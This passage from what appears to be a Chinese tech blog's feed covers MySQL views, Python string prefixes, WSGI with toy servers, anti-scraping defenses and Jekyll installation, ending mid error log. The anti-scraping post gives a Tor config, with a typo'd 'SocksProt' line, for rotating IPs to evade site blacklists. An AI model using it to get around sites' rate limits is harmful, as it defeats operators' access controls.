        <content type="html"><![CDATA[<h2 id="mysql视图的作用"><a href="#mysql视图的作用" class="headerlink" title="mysql视图的作用"></a>mysql视图的作用</h2><p><strong>MySQL视图是一个虚拟表，其内容由查询定义</strong>。同真实的表一样，视图包含一系列带有名称的列和行数据。但是，视图并不在数据库中以存储的数据值集形式存在。行和列数据来自由定义视图的查询所引用的表，并且在引用视图时动态生成。</p><p>对其中所引用的基础表来说，MySQL视图的作用类似于<strong>筛选</strong>。定义视图的筛选可以来自当前或其它数据库的一个或多个表，或者其它视图。通过视图进行查询没有任何限制，通过它们进行数据修改时的限制也很少。</p><p>视图是存储在数据库中的查询的sql 语句，它主要出于两种原因：</p><p>（1）安全原因，视图可以隐藏一些数据，如：社会保险基金表，可以用视图只显示姓名，地址，而不显示社会保险号和工资数等</p><p>（2）另一原因是可使复杂的查询易于理解和使用。</p><p>案列测试：</p><p>测试表:user有id，name，age，sex字段</p><p>测试表:goods有id，name，price字段</p><p>测试表:ug有id，userid，goodsid字段</p><p>视图的作用实在是太强大了，以下是我体验过的好处：</p><h4 id="作用一："><a href="#作用一：" class="headerlink" title="作用一："></a>作用一：</h4><p>提高了重用性，就像一个函数。如果要频繁获取user的name和goods的name。就应该使用以下sql语言。示例：</p><pre><code>select a.name as username, b.name as goodsname from user as a, goods as b, ug as c where a.id=c.userid and c.goodsid=b.id;</code></pre><p>但有了视图就不一样了，创建视图other。示例</p><pre><code>create view other as select a.name as username, b.name as goodsname from user as a, goods as b, ug as c where a.id=c.userid and c.goodsid=b.id;</code></pre><p>创建好视图后，就可以这样获取user的name和goods的name。示例：</p><pre><code>select * from other;</code></pre><p>以上sql语句，就能获取user的name和goods的name了。</p><h4 id="作用二："><a href="#作用二：" class="headerlink" title="作用二："></a>作用二：</h4><p>对数据库重构，却不影响程序的运行。假如因为某种需求，需要将user拆房表usera和表userb，该两张表的结构如下：</p><p>测试表:usera有id，name，age字段</p><p>测试表:userb有id，name，sex字段</p><p>这时如果php端使用sql语句：select * from user;那就会提示该表不存在，这时该如何解决呢。</p><p>解决方案：创建视图。以下sql语句创建视图：</p><pre><code>create view user as select a.name,a.age,b.sex from usera as a, userb as b where a.name=b.name;</code></pre><p>以上假设name都是唯一的。此时php端使用sql语句：</p><pre><code>select * from user;</code></pre><p>就不会报错什么的。这就实现了更改数据库结构，不更改脚本程序的功能了。</p><h4 id="作用三："><a href="#作用三：" class="headerlink" title="作用三："></a>作用三：</h4><p>提高了安全性能。可以对不同的用户，设定不同的视图。例如：某用户只能获取user表的name和age数据，不能获取sex数据。则可以这样创建视图。示例如下：</p><pre><code>create view other as select a.name, a.age from user as a;</code></pre><p>这样的话，使用sql语句</p><pre><code>select * from other;</code></pre><p>最多就只能获取name和age的数据，其他的数据就获取不了了。</p><h4 id="作用四："><a href="#作用四：" class="headerlink" title="作用四："></a>作用四：</h4><p>让数据更加清晰。想要什么样的数据，就创建什么样的视图。经过以上三条作用的解析，这条作用应该很容易理解了吧</p><p>参考自<a href="http://www.cnblogs.com/sustudy/p/4166714.html">sustudy</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中 r&#39;&#39;, b&#39;&#39;, u&#39;&#39;, f&#39;&#39; 的含义</title>
      <link href="2020/05/13/2020-05-13-python_r_b_u_f_str_pre/"/>
      <url>2020/05/13/2020-05-13-python_r_b_u_f_str_pre/</url>
      
        <content type="html"><![CDATA[<h2 id="python中-r’’-b’’-u’’-f’’-的含义"><a href="#python中-r’’-b’’-u’’-f’’-的含义" class="headerlink" title="python中 r’’, b’’, u’’, f’’ 的含义"></a>python中 r’’, b’’, u’’, f’’ 的含义</h2><p>1.字符串前加 r</p><p>r””前缀表示去除转义字符.即如果是“\n”那么表示一个反斜杠字符，一个字母n，而不是表示换行了。<br>以r开头的字符，常用于正则表达式，对应着re模块。</p><p>2.字符串前加 f</p><p>f””前缀表示在字符串内支持大括号内的python 表达式</p><pre><code>import timet0 = time.time()time.sleep(1)name = &#39;processing&#39;print(f&#39;&#123;name&#125; done in &#123;time.time() - t0:.2f&#125; s&#39;) </code></pre><p>3.字符串前加 b</p><p>b” “前缀表示：后面字符串是bytes 类型。网络编程中，服务器和浏览器只认bytes 类型数据。send 函数的参数和 recv 函数的返回值都是 bytes 类型</p><pre><code>response = b&#39;&lt;h1&gt;Hello World!&lt;/h1&gt;&#39;    </code></pre><p>在 Python3 中，bytes 和 str 的互相转换方式是</p><pre><code>str.encode(&#39;utf-8&#39;)bytes.decode(&#39;utf-8&#39;)</code></pre><p>4.字符串前加 u</p><p>u” “前缀表示：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</p><pre><code>u&quot;我是含有中文字符组成的字符串。&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对WSGI的理解</title>
      <link href="2020/05/13/2020-05-13-wsgi/"/>
      <url>2020/05/13/2020-05-13-wsgi/</url>
      
        <content type="html"><![CDATA[<h2 id="对WSGI的理解"><a href="#对WSGI的理解" class="headerlink" title="对WSGI的理解"></a>对WSGI的理解</h2><p>WSGI，Web Server Gateway Interface 的缩写，即Web服务器网关接口。</p><p>下面结合实例加深对WSGI的理解。</p><p>使用Python编写Web应用，可以用比较流行的Flask、Django框架，可选的服务器软件也特别多，常见的有Apache、Nginx、IIS等。但是，现在问题来了，我该怎么部署？在没有WSGI规范之前，一个服务器调度Python应用是用这种方式，另一款服务器使用的是那种方式，这样的话，编写出来的应用部署时只能选择局限的某个或某些服务器，达不到通用的效果。故WSGI应运而生。</p><p>假如有这么一个服务器 server.py</p><pre><code># coding=utf-8import socketlistener = socket.socket()listener.setsockopt(socket.SOL_SOCKET,                    socket.SO_REUSEADDR, 1)listener.bind((&#39;0.0.0.0&#39;, 8080))listener.listen(1)print(&#39;Serving HTTP on 0.0.0.0 port 8080 ...&#39;)while True:    client_connection, client_address = \        listener.accept()    print(f&#39;Server received connection&#39;        f&#39; from &#123;client_address&#125;&#39;)    request = client_connection.recv(1024)    print(f&#39;request we received: &#123;request&#125;&#39;)    response = b&quot;&quot;&quot;HTTP/1.1 200 OKHello, World!&quot;&quot;&quot;    client_connection.sendall(response)    client_connection.close()</code></pre><p>实现比较简单，就是监听 8080 端口，如果有请求在终端进行打印，并返回 Hello, World! 的响应。</p><p>在终端中启动服务器</p><pre><code>~ python server.pyServing HTTP on 0.0.0.0 port 8080 ...</code></pre><p>再开一个终端，发送请求</p><pre><code>~ curl 127.0.0.1:8080HTTP/1.1 200 OKHello, World!</code></pre><p>接收到服务器回传，说明服务器工作正常。</p><p>另外如果有一个web应用 app.py</p><pre><code># coding=utf-8def simple_app():    return b&#39;Hello, World!\r\n&#39;</code></pre><p>现在要部署这个app，简单粗暴的做法就是在服务器里面直接调用app中相应的方法。就像这样</p><p>server2.py</p><pre><code># coding=utf-8import socketlistener = socket.socket()listener.setsockopt(socket.SOL_SOCKET,                    socket.SO_REUSEADDR, 1)listener.bind((&#39;0.0.0.0&#39;, 8080))listener.listen(1)print(&#39;Serving HTTP on 0.0.0.0 port 8080 ...&#39;)while True:    client_connection, client_address = \        listener.accept()    print(f&#39;Server received connection&#39;        f&#39; from &#123;client_address&#125;&#39;)    request = client_connection.recv(1024)    print(f&#39;request we received: &#123;request&#125;&#39;)    from app import simple_app    response = &#39;HTTP/1.1 200 OK\r\n\r\n&#39;    response = response.encode(&#39;utf-8&#39;)    response += simple_app()    client_connection.sendall(response)    client_connection.close()</code></pre><p>运行脚本</p><pre><code>～ python server2.pyServing HTTP on 0.0.0.0 port 8080 ...</code></pre><p>然后请求一下看看效果</p><pre><code>~ curl 127.0.0.1:8080Hello, World!</code></pre><p>嗯，可以了。但是，上面的服务器和应用整体是跑起来了，那么我换一个服务器或者应用呢。由于服务器与应用之间怎么交互完全没有规范，比如服务器应该如何把请求信息传给应用，应用处理完毕后又怎么告诉服务器开始返回响应，如果都是各搞各的，服务器需要定制应用，应用也要定制服务器，这要一个应用能跑起来也太麻烦了点吧。</p><p>所以，WSGI的出现就是为了解决上面的问题，它<strong>规定了服务器怎么把请求信息告诉给应用，应用怎么把执行情况回传给服务器，这样的话，服务器与应用都按一个标准办事，只要实现了这个标准，服务器与应用随意搭配就可以，灵活度大大提高</strong>。</p><p>WSGI 规范了些什么，下图能很直观的说明。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/85637.jpg"></p><p>首先，应用必须是一个可调用对象，可以是函数，也可以是实现了 <strong>call</strong>() 方法的对象。</p><p>每收到一个请求，服务器会通过 application_callable(environ, start_response) 调用应用。</p><p>应用在处理完毕准备返回数据的时候，先调用服务传给它的函数 start_response(status, headers, exec_info)，最后再返回可迭代对象作为数据。</p><p>其中，environ 必须是一个字典，包括了请求的相关信息，比如请求方式、请求路径等等，start_response 是应用处理完毕后，需要调用的函数，用于告诉服务设置响应的头部信息或错误处理等等。</p><p>status 必须是 999 Message here 这样的字符串，比如 200 OK、404 Not Found 等，headers 是一个由 (header_name, header_value) 这样的元祖组成的列表，最后一个 exec_info 是可选参数，一般在应用出现错误的时候会用到。</p><p>知道了 WSGI 的大致概念，下面我们来实现一个。</p><p>首先是应用 wsgi_app.py</p><pre><code># coding=utf-8def simple_app(environ, start_response):    status = &#39;200 OK&#39;    response_headers = [(&#39;Content-type&#39;, &#39;text/plain&#39;)]    start_response(status, response_headers)    return [f&#39;Request &#123;environ[&quot;REQUEST_METHOD&quot;]&#125;&#39;            f&#39; &#123;environ[&quot;PATH_INFO&quot;]&#125; has been&#39;            f&#39; processed\r\n&#39;.encode(&#39;utf-8&#39;)]</code></pre><p>这里定义了一个函数（可调用对象），它可以使用服务器传给它的请求相关的内容 environ，这里使用了 REQUEST_METHOD 和 PATH_INFO 信息。在返回之前调用了 start_response，方便服务器设置一些头部信息。</p><p>然后是服务器 wsgi_server.py</p><pre><code># coding=utf-8import socketlistener = socket.socket()listener.setsockopt(socket.SOL_SOCKET,                    socket.SO_REUSEADDR, 1)listener.bind((&#39;0.0.0.0&#39;, 8080))listener.listen(1)print(&#39;Serving HTTP on 0.0.0.0 port 8080 ...&#39;)while True:    client_connection, client_address = \        listener.accept()    print(f&#39;Server received connection&#39;        f&#39; from &#123;client_address&#125;&#39;)    request = client_connection.recv(1024)    print(f&#39;request we received: &#123;request&#125;&#39;)    headers_set = None    def start_response(status, headers):        global headers_set        headers_set = [status, headers]    method, path, _ = request.split(b&#39; &#39;, 2)    environ = &#123;&#39;REQUEST_METHOD&#39;: method.decode(&#39;utf-8&#39;),            &#39;PATH_INFO&#39;: path.decode(&#39;utf-8&#39;)&#125;    from wsgi_app import simple_app    app_result = simple_app(environ, start_response)    response_status, response_headers = headers_set    response = f&#39;HTTP/1.1 &#123;response_status&#125;\r\n&#39;    for header in response_headers:        response += f&#39;&#123;header[0]&#125;: &#123;header[1]&#125;\r\n&#39;    response += &#39;\r\n&#39;    response = response.encode(&#39;utf-8&#39;)    for data in app_result:        response += data    client_connection.sendall(response)    client_connection.close()</code></pre><p>服务器监听相关代码没怎么变化，主要是处理请求的时候有些不同。</p><p>首先定义了 start_response(status, headers) 函数，自身并不会调用。</p><p>然后调用应用，将当前的请求信息 environ 和上面的 start_response 函数传给它，让其自己决定使用什么请求信息以及在处理完成准备返回数据之前调用 start_response 设置头部信息。</p><p>好了，启动服务器后（即执行服务器代码，和之前的类似，这里不赘述），然后请求看看结果</p><pre><code>~ curl 127.0.0.1:8080/user/1Request GET /user/1 has been processed</code></pre><p>嗯，程序是正常的。</p><p>上面为了说明，代码耦合性较大，如果服务器需要更换应用的话，还得修改服务器代码，这显然是有问题的。现在原理差不多说清楚了，我们把代码优化下</p><p>wsgi_server_oop.py</p><pre><code># coding=utf-8import socketimport sysclass WSGIServer:    def __init__(self):        self.listener = socket.socket()        self.listener.setsockopt(socket.SOL_SOCKET,                                socket.SO_REUSEADDR, 1)        self.listener.bind((&#39;0.0.0.0&#39;, 8080))        self.listener.listen(1)        print(&#39;Serving HTTP on 0.0.0.0&#39;            &#39; port 8080 ...&#39;)        self.app = None        self.headers_set = None    def set_app(self, application):        self.app = application    def start_response(self, status, headers):        self.headers_set = [status, headers]    def serve_forever(self):        while True:            listener = self.listener            client_connection, client_address = \                listener.accept()            print(f&#39;Server received connection&#39;                f&#39; from &#123;client_address&#125;&#39;)            request = client_connection.recv(1024)            print(f&#39;request we received: &#123;request&#125;&#39;)            method, path, _ = request.split(b&#39; &#39;, 2)            # 为简洁的说明问题，这里填充的内容有些随意            # 如果有需要，可以自行完善            environ = &#123;                &#39;wsgi.version&#39;: (1, 0),                &#39;wsgi.url_scheme&#39;: &#39;http&#39;,                &#39;wsgi.input&#39;: request,                &#39;wsgi.errors&#39;: sys.stderr,                &#39;wsgi.multithread&#39;: False,                &#39;wsgi.multiprocess&#39;: False,                &#39;wsgi.run_once&#39;: False,                &#39;REQUEST_METHOD&#39;: method.decode(&#39;utf-8&#39;),                &#39;PATH_INFO&#39;: path.decode(&#39;utf-8&#39;),                &#39;SERVER_NAME&#39;: &#39;127.0.0.1&#39;,                &#39;SERVER_PORT&#39;: &#39;8080&#39;,            &#125;            app_result = self.app(environ, self.start_response)            response_status, response_headers = self.headers_set            response = f&#39;HTTP/1.1 &#123;response_status&#125;\r\n&#39;            for header in response_headers:                response += f&#39;&#123;header[0]&#125;: &#123;header[1]&#125;\r\n&#39;            response += &#39;\r\n&#39;            response = response.encode(&#39;utf-8&#39;)            for data in app_result:                response += data            client_connection.sendall(response)            client_connection.close()if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 2:        sys.exit(&#39;Argv Error&#39;)    app_path = sys.argv[1]    module, app = app_path.split(&#39;:&#39;)    module = __import__(module)    app = getattr(module, app)    server = WSGIServer()    server.set_app(app)    server.serve_forever()</code></pre><p>可以使用以前的应用</p><pre><code>~ python wsgi_server_oop.py wsgi_app:simple_appServing HTTP on 0.0.0.0 port 8080 ...</code></pre><p>请求</p><pre><code>~ curl 127.0.0.1:8080/user/1Request GET /user/1 has been processed</code></pre><p>得到和之前相同的结果。</p><p>Flask 应用能行吗？来试一试，先新建一个</p><p>flask_app.py</p><pre><code># coding=utf-8from flask import Flaskfrom flask import Responseflask_app = Flask(__name__)@flask_app.route(&#39;/user/&lt;int:user_id&gt;&#39;,                methods=[&#39;GET&#39;])def hello_world(user_id):    return Response(        f&#39;Get /user/&#123;user_id&#125; has been&#39;        f&#39; processed in flask app\r\n&#39;,        mimetype=&#39;text/plain&#39;    )</code></pre><p>重新启动服务器</p><pre><code>~ python wsgi_server_oop.py flask_app:flask_appServing HTTP on 0.0.0.0 port 8080 ...</code></pre><p>请求</p><pre><code>~ curl 127.0.0.1:8080/user/1Get /user/1 has been processed in flask app</code></pre><p>Flask 也是遵守 WSGI 规范的，所以执行也没有问题。至此，一个粗略的 WSGI 规范就实现了，虽说代码不优雅，一些核心的东西还是体现出来了。不过毕竟忽略了很多东西，比如错误处理等，要在生产环境中使用的话还远远不够，想知道得更全面的伙伴可以去看看 PEP 3333。</p><p>目前流行的 Web 应用框架比如 Django、Bottle 等，服务器 Apahce、Nginx、Gunicorn 等也都支持这个规范。因此，框架和应用随意搭配基本没什么问题。</p><h3 id="本篇转自大佬-kevinbai"><a href="#本篇转自大佬-kevinbai" class="headerlink" title="本篇转自大佬 kevinbai"></a>本篇转自大佬 <a href="https://www.jianshu.com/p/29f66eb4e55a">kevinbai</a></h3>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wsgi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四种常见反爬虫技术讨论</title>
      <link href="2020/05/12/2020-05-12-four_common_anti-crawl_tech/"/>
      <url>2020/05/12/2020-05-12-four_common_anti-crawl_tech/</url>
      
        <content type="html"><![CDATA[<h2 id="四种常见反爬虫技术讨论"><a href="#四种常见反爬虫技术讨论" class="headerlink" title="四种常见反爬虫技术讨论"></a>四种常见反爬虫技术讨论</h2><p>网站需要保护自己的网站内容，以防止网络爬虫的抓取，会升级一些保护措施。</p><p>我目前见到的有：各种验证码、参数的加密、在前端JS挖坑、访问频率限制（IP黑名单）等。</p><p>　　</p><p>　　1、加密参数。其实老司机们都知道了，在客户端加密参数并没有什么卵用。因为爬虫完全可以将前端的js丢到一个浏览器的内核环境中去执行js，这样的话，无论你怎么加密，都没有用，因为这和在游览器中运行没有什么区别，是无法进行人机识别的。</p><p>　　2、前端在Js脚本中挖坑。网站开发人员在一大堆的js中藏着一小段预警js作为地雷。毕竟一般情况下，爬虫都是直接请求后得到的响应是一段html的文本，并不会执行其中的js。那么这样就区分出来了，网站方可以在页面加载后执行一段js，这段js不用和服务器通信，就是默默的执行。若是这段js执行了，说明访问者很可能是人，若是没有执行，那么这个访问真绝对是爬虫了。在正文请求中附带上的cookie中加上一个特定的标记。告诉服务器这个请求不是人发起的。服务器得到这个消息后，针对IP标记，但是这次请求是允许通过的（隐藏判断依据）。下次或者这个IP访问几次后，就将这个IP拉入黑名单。 </p><p> 　  3、验证码，这东西是主要防御手段，这里不多说，但是，只要技术能力足够，验证码还是会被突破的。</p><p>　　4、IP黑名单，这个是依赖于上面的一个后台防御策略。但是再某种情况下，这种策略确实很有效，而且无解。比如：有一个查询类的网站，通过限制IP的访问次数、频率就完全可以封锁或者限制爬虫，因为爬虫的意义就是自动化的、高效的得到数据。</p><p>​        可以使用tor解决，切换ip地址，在torrc配置文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ControlPort 9051</span><br><span class="line">Socks5Proxy 127.0.0.1:1080</span><br><span class="line">SocksProt 9050</span><br><span class="line">MaxCircuitDirtiness 1 minutes</span><br></pre></td></tr></table></figure><p>参数说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ControlPort 控制程序访问的端口（重要）</span><br><span class="line">Socks5Proxy 前置代理端口</span><br><span class="line">SocksProt 外部程序访问Tor的端口</span><br><span class="line">MaxCircuitDirtiness 自动切换Identity的时间间隔</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术讨论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github jekyll搭建个人博客</title>
      <link href="2020/05/11/2020-05-11-github_jekyll_blog/"/>
      <url>2020/05/11/2020-05-11-github_jekyll_blog/</url>
      
        <content type="html"><![CDATA[<h2 id="github-jekyll搭建个人博客"><a href="#github-jekyll搭建个人博客" class="headerlink" title="github jekyll搭建个人博客"></a>github jekyll搭建个人博客</h2><h3 id="第一步-网站托管"><a href="#第一步-网站托管" class="headerlink" title="第一步 网站托管"></a>第一步 网站托管</h3><p>一个网站要能够在任何地方都能够被访问，那么需要部署到服务器上。github就提供了这样的功能，只要按照github格式要求，新建一个仓库，把你的网站代码上传到里面，那么就可以在任何时候任何地方都能够访问了，那么如何搭建这个代码托管仓库呢？可参考<a href="https://links.jianshu.com/go?to=https://pages.github.com/">官方链接</a>。</p><p>1.首先你要到GitHub上注册一个账号,例如我注册的用户名为：MambaInVeins（用户名可以在设置里改）</p><p>2.点击New repository–&gt;输入仓库名称格式为：用户名.github.io(如：MambaInVeins.github.io)-&gt;点击Create repository</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200423133849.png" alt="image-20200423133451529"></p><p>3.浏览器里访问<a href="https://mambainveins.github.io/,%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%AAurl%E5%8F%AF%E4%BB%A5%E8%A2%AB%E8%AE%BF%E9%97%AE%E4%BA%86%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E6%8A%8A%E6%94%B9%E4%BB%93%E5%BA%93%E6%8B%89%E5%8F%96%E5%88%B0%E6%9C%AC%E5%9C%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8%E9%87%8C%E9%9D%A2%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAindex.html%E7%9A%84%E6%96%87%E4%BB%B6,%E5%9C%A8%E9%87%8C%E9%9D%A2%E8%BE%93%E5%85%A5%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E6%8A%8A%E4%BB%A3%E7%A0%81%E6%8E%A8%E9%80%81%E5%88%B0git%E4%B8%8A%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E8%AE%BF%E9%97%AE%E6%94%B9%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0index.html%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E8%A2%AB%E8%AE%BF%E9%97%AE%E5%88%B0%E4%BA%86%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%EF%BC%8C%E4%B8%80%E4%B8%AA%E5%85%8D%E8%B4%B9%E4%B8%94%E6%97%A0%E9%99%90%E6%B5%81%E9%87%8F%E7%9A%84github%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E4%BB%93%E5%BA%93%E5%B0%B1%E5%88%9B%E5%BB%BA%E5%AE%8C%E6%88%90%E4%BA%86%E3%80%82">https://MambaInVeins.github.io/,可以发现这个url可以被访问了，你可以把改仓库拉取到本地，然后在里面新建一个index.html的文件,在里面输入任意内容，然后再把代码推送到git上，然后再访问改链接，可以发现index.html里面的内容被访问到了。到这里，一个免费且无限流量的github代码托管仓库就创建完成了。</a></p><h3 id="第二步-Jekyll安装"><a href="#第二步-Jekyll安装" class="headerlink" title="第二步 Jekyll安装"></a>第二步 Jekyll安装</h3><p>windows下的安装步骤：</p><ol><li><p>首先点击下载安装<a href="https://rubyinstaller.org/downloads/">Ruby installer</a>;（参考<a href="https://blog.csdn.net/qq_42451091/article/details/105483983">博客</a>）</p><p>选择自己需要的版本，不知道的话就选择红色加粗的那个。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427125515.png" alt="image-20200427125506456"></p><p>（1）下载完成后双击打开,选择 I accept … 后点击next</p><p>（2）下一步里，三个复选框第一个是把Ruby添加到环境变量，第二个是.rb和.rbw文件和Ruby关联，第三个是将UTF-8作为默认的编码，都选上就行了，安装Install。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427130943.png"></p><p>（3）下一步里，复选框的两个都要选，第二个对于使用C语言拓展是必要的，之后点击next</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427130140.png"></p><p>（4）等待安装完成。</p><p>（5）这里的复选框不要选，点击Finish</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427130905.png" alt="https://img-blog.csdnimg.cn/20200413121358635.png"></p><p>（6）接下来需要设置镜像源，打开你安装Ruby的目录，就是这样</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131128.png" alt="在这里插入图片描述"></p><p>（7）然后点击msys64进入，点击etc进入，点击pcman.d进入，现在是这样</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131201.png" alt="在这里插入图片描述"></p><p>（8）现在随便找个 文本编辑器打开目录下的三个文件，我建议使用VS Code(可以百度如何安装)，之后学习Ruby也可以用。<br>编辑 mirrorlist.mingw32 ，在文件开头添加：<br>Server = <a href="https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686">https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686</a><br>编辑 mirrorlist.mingw64 ，在文件开头添加：<br>Server = <a href="https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64">https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64</a><br>编辑 mirrorlist.msys ，在文件开头添加：<br>Server = <a href="https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch">https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch</a><br>操作类似于这样<br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131235.png" alt="在这里插入图片描述"></p><p>（9）现在我们需要回到上一步路过的msys64目录，打开msys2.exe    </p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131316.png" alt="在这里插入图片描述"></p><p>（10）打开后它会自动执行一些操作，执行完成后会出现</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131627.png" alt="image-20200427131400392"></p><p>这时把msys64.exe关闭，之后再重新打开，现在是这样</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131444.png" alt="在这里插入图片描述"></p><p>输入 <code>pacman -Sy</code> 后回车，等待结束关闭即可</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131622.png" alt="在这里插入图片描述"></p><p>（11）现在，进入windows开始菜单(就是左下角的windows图标)，在里面字母R下面找到Ruby下面的命令行，具体看图，找到后点击打开</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131658.png" alt="在这里插入图片描述"></p><p>输入 <code>ridk install 3</code> 点击回车，之后就是等待操作完成(不要关闭程序还要用)。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131819.png" alt="在这里插入图片描述"></p><p>完成后的样子</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200427131825.png" alt="在这里插入图片描述"></p><p>（12）现在输入：<br> <code>gem sources --remove https://rubygems.org/</code> 回车<br> <code>gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/</code> 回车</p><p>（13）现在所有安装都完成了，关闭命令行，可以开始使用Ruby。</p></li><li><p>点击下载<a href="https://rubygems.org/pages/download">RubyGems</a>,下载完成后解压至你想放的位置。 打开命令行执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd D:\rubygems-2.7.4 &#x2F;&#x2F;进入到解压包的位置</span><br><span class="line">ruby setup.rb</span><br></pre></td></tr></table></figure></li><li><p>在命令行执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install jekyll</span><br></pre></td></tr></table></figure></li><li><p>安装完成，我们可以用jekyll命令创建一个博客模板,打开命令行执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd d:</span><br><span class="line">jekyll new testblog</span><br><span class="line">cd testblog</span><br><span class="line">jekyll server</span><br></pre></td></tr></table></figure><p>在浏览器输入<a href="http://127.0.0.1:4000/%E5%8D%B3%E5%8F%AF%E6%B5%8F%E8%A7%88%E5%88%9A%E5%88%9A%E5%88%9B%E5%BB%BA%E7%9A%84blog,%E5%88%B0%E6%AD%A4jekyll">http://127.0.0.1:4000/即可浏览刚刚创建的blog,到此jekyll</a> 就安装完成了。</p></li></ol><h3 id="第三步-Jekyll-主题选择"><a href="#第三步-Jekyll-主题选择" class="headerlink" title="第三步 Jekyll 主题选择"></a>第三步 Jekyll 主题选择</h3><p>上一步我们完成了jekyll的安装，默认创建的博客模板一般比较简单，jekyll官网提供了大量博客模板，我们可以去挑选一个自己喜欢的博客模板，然后在这个博客基础上修改到满足自己需求的博客</p><p>点击前往<a href="http://jekyllthemes.org/">jekyll 主题官网</a></p><p>我选择的<a href="http://jekyllthemes.org/themes/adam-blog/">adam-blog</a>这篇主题。点击Homepage可以链接到该blog Github页面，点击download可以下载该博客源码，点击demo可以预览该博客效果 </p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428131520" alt="img"></p><p>我们点击download，将该源码下载下来，命令行进入该目录执行jekyll server，执行成功可以在控制台看到运行路径： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server address: http:&#x2F;&#x2F;127.0.0.1:4000&#x2F;adam-blog&#x2F;</span><br></pre></td></tr></table></figure><p>若下载的主题jekyll server执行失败，出现如下几类错误</p><p>（1）执行jekyll server命令后可能会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;2.3.0&#x2F;rubygems&#x2F;core_ext&#x2F;kernel_require.rb:55:in &#96;require&#39;: cannot load such file -- bundler (LoadError)</span><br><span class="line">    from D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;2.3.0&#x2F;rubygems&#x2F;core_ext&#x2F;kernel_require.rb:55:in &#96;require&#39;</span><br><span class="line">    from 